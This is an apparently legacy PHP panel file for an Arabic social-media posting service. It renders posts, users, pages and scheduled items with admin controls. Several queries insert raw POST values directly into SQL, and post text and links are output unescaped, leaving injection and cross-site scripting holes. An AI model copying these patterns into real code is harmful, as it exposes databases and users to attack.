            <?php if(Ls('admin') or Ls('demo') or $p['userid'] == userid){ ?>    <a  class="tooltipped" onclick="E_post(<?=$p['id']?>);" data-tooltip="تعديل المنشور" data-tooltip-id="ed472c81-cc4c-1ce6-956d-2ac9b8acd67b"><i class="fa fa-pencil-square-o fa-lg" aria-hidden="true"></i></a>     <?php  } ?>
            <?php if(Ls('admin') or  Ls('demo') or $p['userid'] == userid){ ?>    <a  class="tooltipped" onclick="re(<?=$p['id']?>);" data-tooltip="حذف  المنشور" data-tooltip-id="ed472c81-cc4c-1ce6-956d-2ac9b8acd67b"><i class="fa fa-times fa-lg" aria-hidden="true"></i></a>     <?php  } ?>
            <?php if($p['time'] == 1){ ?>    <a  class="tooltipped" onclick="" data-tooltip="<?=date('g:i A', $p['time_share'])?>" data-tooltip-id="ed472c81-cc4c-1ce6-956d-2ac9b8acd67b"><i class="fa fa-clock-o fa-lg" aria-hidden="true"></i></a>     <?php  } ?>
            <?php if(Ls('admin') or Ls('demo')){ ?>    <a  class="waves-effect waves-light" onclick="msg(<?=$p['userid']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-commenting-o fa-lg" aria-hidden="true"></i></a>
  <a  class="tooltipped" onclick="fb_post(<?=$p['id']?>)" data-tooltip="نشر الان" data-tooltip-id="ed472c81-cc4c-1ce6-956d-2ac9b8acd67b"><i class="fa fa-send fa-lg" aria-hidden="true"></i></a>     <?php  } ?>
            <?php if(Ls('admin') or Ls('demo')){ ?>
                                                   <?php if($Su['block'] == 0){ ?>
                                                 <a class="waves-effect waves-light" onclick="ban(<?=$Su['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-ban fa-lg " aria-hidden="true"></i></a>
                                                <?php }else{?>
                                                 <a class="waves-effect waves-light" onclick="unban(<?=$Su['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-check-circle-o fa-lg " aria-hidden="true"></i></a>

                                                <?php }?>

                 <?php  } ?>

                </div>
                </div>
                </div>

<?php }echo more($tutorial_id,Num('video',"where id < '".$tutorial_id."' and active ='1'"),4); }else{ echo NotFound(); }
    }else{
     header("Location: ../");
     }
 }else if($_GET['step'] == 'Moreposts'){
  if($dir) {
if(isset($_POST['id'])){
         $showLimit = 4;
         $SAll= Num('posts',"WHERE id < ".$_POST['id']." ORDER BY id DESC");
          $post= getUser('posts',"WHERE id < ".$_POST['id']." ORDER BY id DESC LIMIT ".$showLimit);
          }else if(isset($_POST['pid'])){
         $SAll= Num('posts',"WHERE id=".$_POST['pid']." ");
          $post= getUser('posts',"WHERE id=".$_POST['pid']." ");
          }else{
         $showLimit = $St->numposts;
         $SAll= Num('posts'," ORDER BY id DESC");
     $post= getUser('posts'," ORDER BY id DESC LIMIT ".$showLimit);

          }
          if($post){
         for($i=0;$i < count($post);$i++){
             $p = $post[$i];
               $tutorial_id = $p["id"];
             $Su =Selaa($appsql,' where user_id='.$p['userid']);
              if(empty($Su['name'])){
               $Su['name'] = $St->title;
              }
                  if($i == ceil(count($post)/2)  and !empty($St->post_ad) or $i == ceil(count($post)/2)  and !empty($St->admin_name)){
          ?>
     <?php if(!empty($St->post_ad)){  ?>

                  <div class="col  s12 m6 z-depth-1 white t-row hoverable" style="  /*  position: static;*/" id="t<?=$tutorial_id?>">
                            <div class="card no-shadow" style="    margin: 0;">
            <div class="card-content" style="text-align: center;">
       <?=$St->post_ad?>
          </div>
          </div>
                    <div class="icon-column z-depth-1">
          <i class="fa fa-adn fa-lg tooltipped"  data-position="bottom" data-delay="50" data-tooltip="اعلان" aria-hidden="true"></i>
          </div>
          </div>
     <?php }

 } ?>

             <div class="col s12 m6 z-depth-1 white t-row hoverable" id="t<?=$tutorial_id?>">
          <div class="card no-shadow">

            <div class="card-content <?php if($p['type']  != 1 and $p['type']  != 4 and $p['type']  != 7){ ?> valign-wrapper <?php } ?>" style="    direction: rtl;">
            <?php  if($p['type']  == 2 or $p['type']  == 5){

           if(!strpos($p['link'],'imgur')){
         $p['link'] = '../'.$p['link']; }
             ?>
                  <div class="profile-image">
                 <a href="<?=Lurll($p['type'],$p['id'])?>"> <img src="<?=$p['link']?>" class="circle responsive-img z-depth-1" alt=""> </a>
                </div>
                <?php } ?>
                <div class="textLine right-align ">
                    <a href="<?php if($p['type'] == 0 or $p['type'] == 2 or $p['type'] == 5){echo Lurll($p['type'],$p['id']);}else{echo $p['link'];}?>"> <?=html_entity_decode(stripslashes(str_replace('\n',' ',limit_str($p['text'],20))))?>  </a>
              <?php if($p['quran'] == 1){ echo ' ['.$p['suraName'].' : '.$p['VerseID'].']';}      ?>
             </div>
                                 <?php if($p['type']  == 1 or $p['type']  == 4 or $p['type']  == 7){ ?>

          <div>   <a href="<?=$p['link']?>" target="_blank" class="truncate left-align" > <?=$p['link']?> </a> </div>

                <?php } ?>
				</div>
            <div class="card-action center" dir="rtl">
              <div class="date col s8"><a  style="    margin: 0px; " href="#" class="blue-text"><?=limit_str($Su['name'],2)?></a> ❖ <pp><?=cptime($p['date'])?><pp></div>
              <div class="share col s4">
 <?php
 $date = date_create($p['time_share']);
 if($p['userid'] != userid){
if($p['active'] == 0){
   echo "<pp style='    color: #ee6e73;'>باانتظار المراجعه</pp>"  ;
}else{
echo  "<pp style='    color: #4caf50;'>تمت المراجعه</pp>" ;
}
}else{
if($p['time'] == 1 and $p['Tsend'] == 0){
   echo date('g:i A', $p['time_share'])." <pp style='    display: inline-block;'> : بالانتظار</pp>";
}else if($p['time'] == 0){
   echo date('g:i A', $p['date'])." <pp style='    display: inline-block;'> : تم النشر</pp>";
}else{
   echo date('g:i A', $p['time_share'])." <pp style='    display: inline-block;'> : تم النشر</pp>";
}


}
?>

<!--              <div class="col s2">
<button class='btn  waves-effect waves-light ' href='#'><i class="material-icons">add</i></button>
</div>-->
            </div>
             <div class=" center col s12 m12 waves-effect waves-light footer-post" id="footer-post">
                             <a class="tooltipped " onclick="fb_share(<?=$p['id']?>);"  data-position="bottom" data-delay="50" data-tooltip="نشر على فيس بوك"><i class="fa fa-facebook-square fa-lg " aria-hidden="true"></i></a>
                <a class="tooltipped" onclick="tw_share(<?=$p['id']?>);" data-position="bottom" data-delay="50" data-tooltip="نشر على تويتر"><i class="fa fa-twitter-square fa-lg" aria-hidden="true"></i></a>
                <a class="tooltipped" onclick="add_time(<?=$p['id']?>);" data-tooltip="النشر لاحقا" data-tooltip-id="ed472c81-cc4c-1ce6-956d-2ac9b8acd67b"><i class="fa fa-calendar-plus-o  fa-lg" aria-hidden="true"></i></a>
                         <?php if(Ls('admin') and  $p['active'] == 0 or Ls('demo')  and  $p['active'] == 0){ ?>    <a  class="tooltipped" onclick="A_post(<?=$p['id']?>);" data-tooltip="الموافقه على المنشور" data-tooltip-id="ed472c81-cc4c-1ce6-956d-2ac9b8acd67b"><i class="fa fa-check-circle-o fa-lg" aria-hidden="true"></i></a>     <?php  } ?>
                         <?php if(Ls('admin')  and  $p['active'] == 0 or Ls('demo') and  $p['active'] == 0){ ?>    <a  class="tooltipped" onclick="Aa_post(<?=$p['id']?>);" data-tooltip="الموافقه على المنشور" data-tooltip-id="ed472c81-cc4c-1ce6-956d-2ac9b8acd67b"><i class="fa fa-check-circle fa-lg" aria-hidden="true"></i></a>     <?php  } ?>

            <?php if(Ls('admin') or Ls('demo') or $p['userid'] == $userid){ ?>    <a  class="tooltipped" onclick="E_post(<?=$p['id']?>);" data-tooltip="تعديل المنشور" data-tooltip-id="ed472c81-cc4c-1ce6-956d-2ac9b8acd67b"><i class="fa fa-pencil-square-o fa-lg" aria-hidden="true"></i></a>     <?php  } ?>
            <?php if(Ls('admin') or Ls('demo') or $p['userid'] == $userid){ ?>    <a  class="tooltipped" onclick="re(<?=$p['id']?>);" data-tooltip="حذف  المنشور" data-tooltip-id="ed472c81-cc4c-1ce6-956d-2ac9b8acd67b"><i class="fa fa-times fa-lg" aria-hidden="true"></i></a>     <?php  } ?>
            <?php if($p['time'] == 1){ ?>    <a  class="tooltipped" onclick="" data-tooltip="<?=date('g:i A', $p['time_share'])?>" data-tooltip-id="ed472c81-cc4c-1ce6-956d-2ac9b8acd67b"><i class="fa fa-clock-o fa-lg" aria-hidden="true"></i></a>     <?php  } ?>
            <?php if(Ls('admin')  or Ls('demo')){ ?> <a  class="waves-effect waves-light" onclick="msg(<?=$p['userid']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-commenting-o fa-lg" aria-hidden="true"></i></a>
   <a  class="tooltipped" onclick="fb_post(<?=$p['id']?>)" data-tooltip="نشر الان" data-tooltip-id="ed472c81-cc4c-1ce6-956d-2ac9b8acd67b"><i class="fa fa-send fa-lg" aria-hidden="true"></i></a>     <?php  } ?>
            <?php if(Ls('admin') or Ls('demo')){ ?>
                                                   <?php if($Su['block'] == 0){ ?>
                                                 <a class="waves-effect waves-light" onclick="ban(<?=$Su['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-ban fa-lg " aria-hidden="true"></i></a>
                                                <?php }else{?>
                                                 <a class="waves-effect waves-light" onclick="unban(<?=$Su['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-check-circle-o fa-lg " aria-hidden="true"></i></a>

                                                <?php }?>

                 <?php  } ?>

            </div>
            </div>
          </div>
          <div class="icon-column z-depth-1">
             <a href="<?=Fb($p['userid'])?>" target="_blank">     <img src="<?=FBImg($p['userid'])?>" class="circle responsive-img z-depth-1 tooltipped"  data-position="bottom" data-delay="50" data-tooltip="<?=$Su['name']?>"  alt=""></a>
          </div>
        </div>


        <!-- DIVIDER  START-->

       <!--   <div class="clearfix"></div> -->
          <!-- DIVIDER END -->
          <?php   } }else{ echo NotFound();} if(!isset($_POST['pid'])){ echo more($tutorial_id,Num('posts',"where id <".$tutorial_id),4);} ?>
<script type="text/javascript">
 toda ();
</script>
<?php
    }else{
     header("Location: ../");
     }

  }else if($_GET['step'] == 'users'){
  if($dir) {
$t= Ser(isv('TSearch'));
$id=  isv('id');
$sid= Sion('sid');
$app= isv('app',1);
$tp = $appsql;
$tname = 'name';
if(!$_POST['TSearch']){
        if(!$_POST['id']){
         $showLimit=12;
        $SPost= getUser($tp," ORDER BY id DESC LIMIT ".$showLimit);
        }else{
         $showLimit=4;
        $SPost= getUser($tp,"WHERE id < ".$id." ORDER BY id DESC LIMIT ".$showLimit);
        }
}else{
         $showLimit=12;
         $SPost= getUser($tp,"WHERE $tname LIKE '%$t%' ORDER BY id DESC LIMIT ".$showLimit);
}
                            if($SPost){
                           for($i=0;$i<count($SPost);$i++){
                               $Sb = $SPost[$i];
                               $tutorial_id = $Sb["id"];
                                 if(!$t){
                                 $Snum =Num($tp,"where id <".$tutorial_id);
                                 }else{
                                 $Snum =Num($tp,"where $tname LIKE '%$t%' and id <".$tutorial_id);

                                 }
                                $c = strtolower($Sb['cantry']);
                           $S= Num('posts','where userid='.$Sb['user_id']);
                           ?>

			<div class="col s12 m3" id="t<?=$Sb['id']?>" style="direction: rtl;">


    <ul class="collection with-header">
     <li class="collection-item text-right"><?=cptime($Sb['data'])?></li>
                                                <li class="collection-header center"><div class="well text-center" style="direction: rtl">
                                                 <img class="circle" src="<?=FbImg($Sb['user_id'],'normal')?>" alt=""  width="80"  height="80" />
                                                </div></li>
                                                <li class="collection-item center truncate " ><a target="_blank" href="<?=Fb($Sb['user_id'])?>"><?=limit_str($Sb['name'],20)?></a></li>
                                                <li class="collection-item text-right "><?=Ginfo($lg,$Sb['type'])?></li>
                                               <li class="collection-item text-right truncate "><img src="../assets/images/blank.gif" class="flag flag-<?=$c?>" alt="" /> <?=getCName($c)?></li>
                                           <?php if($St->cron == 2) {?>    <li class="collection-item text-right truncate">وقت النشر : <?=$Sb['time']?></li>  <?php } ?>
                                                <li class="collection-item text-right"><?=lang($lg,'share')?> : <?=isSend($lg,$Sb['send'])?></li>
                                                <li class="collection-item center">
                                                      <a  class="waves-effect waves-light tooltipped" data-tooltip="حذف" onclick="re(<?=$Sb['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-times fa-lg" aria-hidden="true"></i></a>
                                                      <a  class="waves-effect waves-light tooltipped" data-tooltip="رساله" onclick="msg(<?=$Sb['user_id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-commenting-o fa-lg" aria-hidden="true"></i></a>
                                                      <a class="waves-effect waves-light tooltipped" data-tooltip="البريد" onclick="Uemail('<?=$Sb['user_id']?>')" id="<?=$Sb['id']?>" ><i class="fa fa-envelope-o  fa-lg" aria-hidden="true"></i></a>
                                                      <a   onclick="check(<?=$Sb['id']?>)" data-tooltip="فحص" id="<?=$Sb['id']?>" class="tooltipped" ><i class="fa fa-search fa-lg" aria-hidden="true"></i></a>
                                                <?php if($Sb['block'] == 0){ ?>
                                                 <a class="waves-effect waves-light tooltipped" data-tooltip="حظر" onclick="ban(<?=$Sb['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-ban fa-lg" aria-hidden="true"></i></a>
                                                <?php }else{?>
                                                 <a class="waves-effect waves-light tooltipped" data-tooltip="الغاء الحظر" onclick="unban(<?=$Sb['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-check-circle-o  fa-lg" aria-hidden="true"></i></a>

                                                <?php }?>


                                                 </li>
                                              </ul>


      </div>
<?php } }else{ echo NotFound(); } echo more($tutorial_id,$Snum,4);  ?>
<script type="text/javascript">
toda();
</script>
                           <?php
                               }else{
     header("Location: ../");
     }


                            }else if($_GET['step'] == 'des'){
if($dir){
$t= Ser(isv('TSearch'));
$id=  isv('id');
$sid= Sion('sid');
$app= isv('app',1);
$tp = 'msg_off';
$tname = 'reson';
if(!$_POST['TSearch']){
        if(!$_POST['id']){
         $showLimit=12;
        $SPost= getUser($tp," ORDER BY id DESC LIMIT ".$showLimit);
        }else{
         $showLimit=4;
        $SPost= getUser($tp,"WHERE id < ".$id." ORDER BY id DESC LIMIT ".$showLimit);
        }
}else{
         $showLimit=12;
         $SPost= getUser($tp,"WHERE $tname LIKE '%$t%' or name LIKE '%$t%' ORDER BY id DESC LIMIT ".$showLimit);
}
                            if($SPost){
                           for($i=0;$i<count($SPost);$i++){
                               $S = $SPost[$i];
                               $tutorial_id = $S["id"];
                                 if(!$t){
                                 $Snum =Num($tp,"where id <".$tutorial_id);
                                 }else{
                                 $Snum =Num($tp,"where $tname LIKE '%$t%' or name LIKE '%$t%' and id <".$tutorial_id);

                                 }
                               $Sb= Selaa($appsql,'where user_id='.$S['user_id']);
                                $c = strtolower($Sb['cantry']);
                           //$S= Num('posts','where userid='.$Sb['user_id']);
                           ?>

			<div class="col s12 m3" id="t<?=$S['id']?>" style="direction: rtl;">


    <ul class="collection with-header">
     <li class="collection-item text-right"><?=cptime($Sb['data'])?></li>
                                                <li class="collection-header center"><div class="well text-center" style="direction: rtl">
                                                 <img class="circle" src="<?=FbImg($Sb['user_id'],'normal')?>" alt=""  width="80"  height="80" />
                                                </div></li>

                                                <li class="collection-item center truncate"> <?=limit_str($S['reson'],12)?> </li>
                                                <li class="collection-item center truncate"><a target="_blank" href="<?=Fb($Sb['user_id'])?>"><?=limit_str($Sb['name'],20)?></a></li>
                                                <li class="collection-item text-right"><?=Ginfo($lg,$Sb['type'])?></li>
                                                <li class="collection-item text-right"><?=Dactive($lg,$Sb['disactive'])?></li>
                                               <li class="collection-item text-right"><img src="../assets/images/blank.gif" class="flag flag-<?=$c?>" alt="" /> <?=getCName($c)?></li>
                                                <li class="collection-item center">


                                                      <a  class="waves-effect waves-light" onclick="re(<?=$S['id']?>)" id="<?=$S['id']?>" ><i class="fa fa-times fa-lg" aria-hidden="true"></i></a>
                                                      <a   onclick="check(<?=$Sb['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-search fa-lg" aria-hidden="true"></i></a>
                                                <a   onclick="more(<?=$S['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-eye fa-lg " aria-hidden="true"></i></a>
                                                <?php if($Sb['block'] == 0){ ?>
                                                 <a class="waves-effect waves-light" onclick="ban(<?=$Sb['id']?>)" id="<?=$S['id']?>" ><i class="fa fa-ban fa-lg" aria-hidden="true"></i></a>
                                                <?php }else{?>
                                                 <a class="waves-effect waves-light" onclick="unban(<?=$Sb['id']?>)" id="<?=$S['id']?>" ><i class="fa fa-check-circle-o  fa-lg" aria-hidden="true"></i></a>

                                                <?php }?>


                                                 </li>
                                              </ul>


      </div>



      <?php } }else{ echo NotFound(); } echo more($tutorial_id,$Snum,4);

    }else{
     header("Location: ../");
     }

 }else if($_GET['step'] == 'tw'){
if($dir){
$t= Ser(isv('TSearch'));
$id=  isv('id');
$sid= Sion('sid');
$app= isv('app',1);
$tp = 'users_tw';
$tname = 'username';
if(!$_POST['TSearch']){
        if(!$_POST['id']){
         $showLimit=12;
        $SPost= getUser($tp," ORDER BY id DESC LIMIT ".$showLimit);
        }else{
         $showLimit=4;
        $SPost= getUser($tp,"WHERE id < ".$id." ORDER BY id DESC LIMIT ".$showLimit);
        }
}else{
         $showLimit=12;
         $SPost= getUser($tp,"WHERE $tname LIKE '%$t%' ORDER BY id DESC LIMIT ".$showLimit);
}
                            if($SPost){
                           for($i=0;$i<count($SPost);$i++){
                               $Sb = $SPost[$i];
                               $tutorial_id = $Sb["id"];
                                 if(!$t){
                                 $Snum =Num($tp,"where id <".$tutorial_id);
                                 }else{
                                 $Snum =Num($tp,"where $tname LIKE '%$t%' and id <".$tutorial_id);

                                 }
                           ?>

			<div class="col s12 m3" id="t<?=$Sb['id']?>" style="direction: rtl;">


    <ul class="collection with-header">
     <li class="collection-item text-right"><?=cptime($Sb['data'])?></li>
                                                <li class="collection-header center"><div class="well text-center" style="direction: rtl">
                                                 <img class="circle" src="<?=TwImg($Sb['screen_name'])?>" alt=""  width="80"  height="80" />
                                                </div></li>
                                                <li class="collection-item center truncate"><a target="_blank" href="<?=Tw($Sb['screen_name'])?>"><?=limit_str($Sb['username'],20)?></a></li>
                                                <li class="collection-item text-right"><?=lang($lg,'share')?> : <?=isSend($lg,$Sb['send'])?></li>
                                                <li class="collection-item center">


                                                      <a  class="waves-effect waves-light" onclick="re(<?=$Sb['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-times fa-lg" aria-hidden="true"></i></a>
                                                      <a   onclick="check(<?=$Sb['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-search fa-lg" aria-hidden="true"></i></a>
                                                <?php if($Sb['block'] == 0){ ?>
                                                 <a class="waves-effect waves-light" onclick="ban(<?=$Sb['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-ban fa-lg" aria-hidden="true"></i></a>
                                                <?php }else{?>
                                                 <a class="waves-effect waves-light" onclick="unban(<?=$Sb['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-check-circle-o  fa-lg" aria-hidden="true"></i></a>

                                                <?php }?>


                                                 </li>
                                              </ul>


      </div>
<?php } }else{ echo NotFound(); } echo more($tutorial_id,$Snum,4);

    }else{
     header("Location: ../");
     }


 }else if($_GET['step'] == 'pages'){
if($dir){
$t= Ser(isv('TSearch'));
$id=  isv('id');
$sid= Sion('sid');
$app= isv('app',1);
$tp = 'pages';
$tname = 'name';
if(!$_POST['TSearch']){
        if(!$_POST['id']){
         $showLimit=12;
        $SPost= getUser($tp," ORDER BY id DESC LIMIT ".$showLimit);
        }else{
         $showLimit=4;
        $SPost= getUser($tp,"WHERE id < ".$id." ORDER BY id DESC LIMIT ".$showLimit);
        }
}else{
         $showLimit=12;
         $SPost= getUser($tp,"WHERE $tname LIKE '%$t%' ORDER BY id DESC LIMIT ".$showLimit);
}
                            if($SPost){
                           for($i=0;$i<count($SPost);$i++){
                               $Sb = $SPost[$i];
                               $tutorial_id = $Sb["id"];
                                 if(!$t){
                                 $Snum =Num($tp,"where id <".$tutorial_id);
                                 }else{
                                 $Snum =Num($tp,"where $tname LIKE '%$t%' and id <".$tutorial_id);

                                 }

                           ?>

			<div class="col s12 m3" id="t<?=$Sb['id']?>" style="direction: rtl;">


    <ul class="collection with-header">
     <li class="collection-item text-right"><?=cptime($Sb['data'])?></li>
                                                <li class="collection-header center"><div class="well text-center" style="direction: rtl">
                                                 <img class="circle" src="<?=FbImg($Sb['pid'],'normal')?>" alt=""  width="80"  height="80" />
                                                </div></li>
                                                <li class="collection-item center truncate"><a target="_blank" href="<?=Fb($Sb['pid'])?>"><?=limit_str($Sb['name'],20)?></a></li>
                                                <li class="collection-item text-right"><?=lang($lg,'share')?> : <?=isSend($lg,$Sb['send'])?></li>
                                                <li class="collection-item center">


                                                      <a  class="waves-effect waves-light" onclick="re(<?=$Sb['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-times fa-lg" aria-hidden="true"></i></a>
                                                <?php if($Sb['active'] == 0){ ?>
                                                 <a class="waves-effect waves-light" onclick="ban(<?=$Sb['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-ban fa-lg" aria-hidden="true"></i></a>
                                                <?php }else{?>
                                                 <a class="waves-effect waves-light" onclick="unban(<?=$Sb['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-check-circle-o  fa-lg" aria-hidden="true"></i></a>

                                                <?php }?>


                                                 </li>
                                              </ul>


      </div>
<?php } }else{ echo NotFound(); }  echo more($tutorial_id,$Snum,4);

    }else{
     header("Location: ../");
     }

 }else if($_GET['step'] == 'Pactive'){
if($dir){
$t= Ser(isv('TSearch'));
$id=  isv('id');
$sid= Sion('sid');
$app= isv('app',1);
if($app == 'Dactive'){
$tp = 'posts';
$tname = 'text';
$where = 'where active ="0" and send ="0" ';
}else if($app == 'Tactive'){
$tp = 'posts';
$tname = 'text';
$where = 'where active ="1" and send ="0"  ';

}else if($app == 'video'){
$video = 1;
$tp = 'video';
$tname = 'title';
$where = 'where active !="2" ';
}else{
$tp = 'posts';
$tname = 'text';
$where = 'where active ="1" and send ="1" ';
}
if(!$_POST['TSearch']){
        if(!$_POST['id']){
         $showLimit=12;
        $SPost= getUser($tp," $where ORDER BY id DESC LIMIT ".$showLimit);
        }else{
         $showLimit=4;
         //$where .= ' and ';
        $SPost= getUser($tp," $where  and id < ".$id." ORDER BY id DESC LIMIT ".$showLimit);
        }
}else{
         $showLimit=12;
         $SPost= getUser($tp,"$where and $tname LIKE '%$t%' ORDER BY id DESC LIMIT ".$showLimit);
}
                            if($SPost){
                           for($i=0;$i<count($SPost);$i++){
                               $Sb = $SPost[$i];
                               $tutorial_id = $Sb["id"];
                             $send=  $Sb['send'];
                               $id = $Sb["id"];
                                 if(!$t){
                                 $Snum =Num($tp," $where and  id <".$tutorial_id);
                                 }else{
                                 $Snum =Num($tp,"$where and $tname LIKE '%$t%' and id <".$tutorial_id);

                                 }
                               // $c = strtolower($Sb['cantry']);
                           $S= Selaa($appsql,'where user_id='.$Sb['userid']);
                           if($video){
                           $Sp= Selaa('posts','where vid='.$Sb['id']);
                           //$Sb['id'] = $Sp['id'];
                           //$Sb['active'] = $Sp['active'];
                            $send =  $Sp['send'];
                                 }
                           ?>

			<div class="col s12 m3" id="t<?=$Sb['id']?>" style="direction: rtl;">


    <ul class="collection with-header">
     <li class="collection-item text-right"><?=cptime($Sb['date'])?></li>
     <?php if($video){ ?>
                                                <li class="collection-item center truncate"><a target="_blank" href="<?=Uvideo($Sb['id'])?>"><?=limit_str($Sb['title'],20)?></a></li>
<?php } ?>
                                                <li class="collection-header center">
     <?php if(!$video){ ?>
                                                <div class="truncate text-center" style="direction: rtl">
                                                  <?=html_entity_decode(stripslashes(str_replace('\n',' ',limit_str($Sb['text'],5))))?>
                                                </div>
     <?php }else{ ?>
     <div class="card-content" style="    padding: 0;    position: relative;">
                 <div class="center post-img post-img-video"><a href="<?=Uvideo($Sb['id'])?>">  <img src="<?=$Sb['img']?>" class=" responsive-img z-depth-1" alt=""></a></div>
                </div>
     <?php } ?>

                                                </li>
                                                <li class="collection-item center truncate"><a target="_blank" href="<?=Fb($Sb['userid'])?>"><?=limit_str($S['name'],20)?></a></li>
     <?php if(!$video){ ?>
      <li class="collection-item text-right truncate"><?=lang($lg,"type_post")?> : <?=Ginfo($lg,$Sb['type'])?></li>
     <?php } ?>
                                                <li class="collection-item text-right"><?=lang($lg,'share')?> : <?=isSend($lg,$send)?></li>
                                                <li class="collection-item center" style="font-size: 12px;">


                                                      <a  class="waves-effect waves-light" onclick="re(<?=$Sb['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-times " aria-hidden="true"></i></a>
                                                <a   onclick="check(<?=$S['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-search " aria-hidden="true"></i></a>
                                                <a   onclick="E_post(<?=$Sb['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-eye " aria-hidden="true"></i></a>
                                                <a   onclick="fb_post(<?=$Sb['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-send " aria-hidden="true"></i></a>
                                                <?php if($Sp['active'] == 0){ ?>
                                                 <a class="waves-effect waves-light" onclick="A_post(<?=$Sp['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-check-circle-o " aria-hidden="true"></i></a>
                                                 <a class="waves-effect waves-light" onclick="Aa_post(<?=$Sp['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-check-circle " aria-hidden="true"></i></a>
                                                <?php }else{?>
                                                 <a class="waves-effect waves-light" onclick="D_post(<?=$Sp['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-thumbs-o-down  " aria-hidden="true"></i></a>

                                                <?php }?>
                                                <?php if($Sb['block'] == 0){ ?>
                                                 <a class="waves-effect waves-light" onclick="ban(<?=$S['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-ban " aria-hidden="true"></i></a>
                                                <?php }else{?>
                                                 <a class="waves-effect waves-light" onclick="unban(<?=$S['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-check-circle-o  " aria-hidden="true"></i></a>

                                                <?php }?>


                                                 </li>
                                              </ul>


      </div>
<?php } }else{ echo NotFound(); } echo more($tutorial_id,$Snum,4);
    }else{
     header("Location: ../");
     }

 }else if($_GET['step'] == 'myposts'){
if($dir){
                               if(Ls()){
$video='';
$t= Ser(isv('TSearch'));
$id=  isv('id');
$sid= Sion('sid');
$app= isv('app',1);
if($app == 'calendar'){
  $time=1;
$tp = 'posts';
$tname = 'text';
$where = ' time ="1" and Tsend="0" and userid="'.$sid.'" ';
}else if($app == 'app_calendar'){
 $app_g=1;
$tp = 'posts';
$tname = 'text';
$where = ' send ="0" and active="1" ';
}else{
$tp = 'posts';
$tname = 'text';
$where = '  userid="'.$sid.'" and time ="1" and Tsend !="0" or userid="'.$sid.'" and time !="1" ';
}
if(!isset($_POST['TSearch'])){
        if(!isset($_POST['id'])){
         $showLimit=12;
        $SPost= getUser($tp," where $where ORDER BY id DESC LIMIT ".$showLimit);
        }else{
         $showLimit=8;
         //$where .= ' and ';
        $SPost= getUser($tp," where  id < ".$id." and $where ORDER BY id DESC LIMIT ".$showLimit);
        }
}else{
         $showLimit=12;
         //$where .= ' and ';
         $SPost= getUser($tp," where $tname LIKE '%$t%' and $where ORDER BY id DESC LIMIT ".$showLimit);
}
                            if($SPost){
                           for($i=0;$i<count($SPost);$i++){
                               $Sb = $SPost[$i];
                               $tutorial_id = $Sb["id"];
                               $id = $Sb["id"];
                                 if(!$t){
                                 $Snum =Num($tp," where  id <'".$tutorial_id."' and $where ");
                                 }else{
                                 $Snum =Num($tp,"where  $tname LIKE '%$t%'  and $where  ");

                                 }
                               // $c = strtolower($Sb['cantry']);
                           $S= Selaa($appsql,'where user_id='.$Sb['userid']);
                           ?>

			<div class="col s12 m3 right" id="t<?=$Sb['id']?>" style="direction: rtl;">


    <ul class="collection with-header">
     <li class="collection-item text-right"><?=cptime($Sb['date'])?></li>
                                                <li class="collection-header center">
     <?php if(!$video){ ?>
                                                <div class="truncate text-center" style="direction: rtl">
                                                  <?=html_entity_decode(stripslashes(str_replace('\n',' ',limit_str($Sb['text'],20))))?>
                                                </div>
     <?php }else{ ?>
     <div class="card-content" style="    padding: 0;    position: relative;">
                 <div class="center post-img post-img-video"><a href="<?=Uvideo($Sb['id'])?>">  <img src="<?=$Sb['img']?>" class=" responsive-img z-depth-1" alt=""></a></div>
                </div>
     <?php } ?>

                                                </li>

     <?php if(!$video){ ?>
      <li class="collection-item text-right"><?=lang($lg,"type_post")?> : <?=Ginfo($lg,$Sb['type'])?></li>
     <?php } ?>
     <?php if($time){ ?>

                                                <li class="collection-item text-right"><?=lang($lg,'share')?> : <?=date('g:i A', $Sb['time_share'])?> </li>
     <?php } ?>

                                                <li class="collection-item card-action center" style="/*font-size: 12px;*/">

                             <a class="tooltipped " onclick="fb_share(<?=$Sb['id']?>);"  data-position="bottom" data-delay="50" data-tooltip="نشر على فيس بوك"><i class="fa fa-facebook-square fa-lg " aria-hidden="true"></i></a>
                <a class="tooltipped" onclick="tw_share(<?=$Sb['id']?>);" data-position="bottom" data-delay="50" data-tooltip="نشر على تويتر"><i class="fa fa-twitter-square fa-lg" aria-hidden="true"></i></a>

     <?php if(!$app_g){ ?>
                                                      <a  class="waves-effect waves-light" onclick="re(<?=$Sb['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-times  fa-lg" aria-hidden="true"></i></a>

                                                <a   onclick="E_post(<?=$Sb['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-eye fa-lg " aria-hidden="true"></i></a>
     <?php }else{ ?>
                                                <a   onclick="more(<?=$Sb['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-eye  fa-lg" aria-hidden="true"></i></a>
<?php  } ?>


                                                 </li>
                                              </ul>


      </div>
<?php } }else{ echo NotFound(); }  echo more($tutorial_id,$Snum,4);

 }else{ ?>  <script type="text/javascript">  login('fb'); </script>   <?php  }
    }else{
     header("Location: ../");
     }

